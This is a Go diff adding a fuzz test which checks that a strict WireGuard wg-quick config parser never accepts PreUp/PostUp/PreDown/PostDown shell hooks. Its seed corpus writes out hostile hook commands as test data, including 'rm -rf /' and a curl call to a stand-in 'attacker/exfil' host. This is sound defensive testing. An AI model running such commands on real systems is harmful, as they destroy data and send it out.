@@ -8,6 +8,7 @@ import (
 	"io"
 	"net"
 	"net/netip"
+	"strings"
 	"testing"
 	"time"
 
@@ -59,6 +60,65 @@ func FuzzConfigParsers(f *testing.F) {
 		_ = config.MergeWGQuick(&cfg.WireGuard, input)
 		_ = yaml.Unmarshal([]byte(input), &cfg)
 		_ = cfg.Normalize()
+	})
+}
+
+// FuzzMergeWGQuickStrict pins the load-bearing invariant of the strict
+// wg-quick parser: no matter what bytes an attacker pushes through the
+// runtime API or any other untrusted INI surface, the resulting WireGuard
+// struct must have zero PreUp / PostUp / PreDown / PostDown entries — there
+// must be no way to stage a shell hook, even if scripts.allow is later
+// flipped on by mistake.
+//
+// The seed corpus exercises the shapes a hostile config might use:
+// vanilla scripts, the #! transport directives that ARE allowed by design,
+// BOMs, NULs, mixed line endings, multi-kilobyte values. Anything the
+// parser accepts must drop the script keys; anything else must error.
+func FuzzMergeWGQuickStrict(f *testing.F) {
+	scriptPath := "/tmp/should-not-be-touched"
+	for _, seed := range []string{
+		// Plain hostile shapes
+		"[Interface]\nPrivateKey = aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkAAA=\nPostUp = touch " + scriptPath + "\n",
+		"[Interface]\nPostDown = rm -rf /\n",
+		"[Interface]\npreup = curl http://attacker/exfil\n",
+		"[Interface]\nPRE_DOWN = wget evil\n",
+		"[Interface]\n  PostUp   =   tabs and spaces matter\n",
+		// #! directives that ARE allowed by design — they must continue
+		// being accepted; this catches an over-eager strict mode.
+		"[Interface]\nAddress = 100.64.0.2/32\n#!Control=http://control.example/\n[Peer]\nPublicKey = aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkAAA=\nAllowedIPs = 100.64.0.1/32\n",
+		"[Interface]\n#!TURN=turn://relay.example:3478\n",
+		// Pathological encodings
+		"\xef\xbb\xbf[Interface]\nPostUp = touch " + scriptPath + "\n", // UTF-8 BOM
+		"[Interface]\nPostUp = bad\x00null\x00\n",                      // embedded NUL
+		"[Interface]\r\nPostUp = crlf\r\n",                             // CRLF
+		"[Interface]\nPostUp = " + strings.Repeat("A", 4096) + "\n",    // long value
+	} {
+		f.Add(seed)
+	}
+	f.Fuzz(func(t *testing.T, input string) {
+		if len(input) > 1<<16 {
+			t.Skip()
+		}
+		var wg config.WireGuard
+		err := config.MergeWGQuickStrict(&wg, input)
+		// Whether the parser accepts or rejects the input doesn't matter.
+		// What matters is: if it accepted, the script-hook fields MUST be
+		// empty. A nonzero len here = the strict mode regressed.
+		if err != nil {
+			return
+		}
+		if len(wg.PreUp) != 0 {
+			t.Fatalf("strict parser accepted PreUp=%v from input %q", wg.PreUp, input)
+		}
+		if len(wg.PostUp) != 0 {
+			t.Fatalf("strict parser accepted PostUp=%v from input %q", wg.PostUp, input)
+		}
+		if len(wg.PreDown) != 0 {
+			t.Fatalf("strict parser accepted PreDown=%v from input %q", wg.PreDown, input)
+		}
+		if len(wg.PostDown) != 0 {
+			t.Fatalf("strict parser accepted PostDown=%v from input %q", wg.PostDown, input)
+		}
 	})
 }
 
